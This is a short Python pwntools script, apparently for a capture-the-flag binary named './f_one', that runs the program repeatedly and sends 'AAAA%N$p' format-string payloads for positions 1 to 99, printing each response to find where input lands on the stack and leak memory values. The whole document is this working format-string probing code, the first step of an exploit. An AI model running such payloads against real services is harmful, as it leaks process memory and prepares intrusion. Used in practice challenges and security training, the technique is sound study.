from pwn import *

exe = './f_one'

elf = context.binary = ELF(exe, checksec=False)

context.log_level = 'warning'

for i in range(1, 100):
	try:
		p = process()
		p.sendlineafter(b':', 'AAAA%{}$p'.format(i).encode())
		p.recvline()
		result = p.recvline()
		print(str(i) + ': ' + str(result))
		p.close()
	except EOFError:
		pass
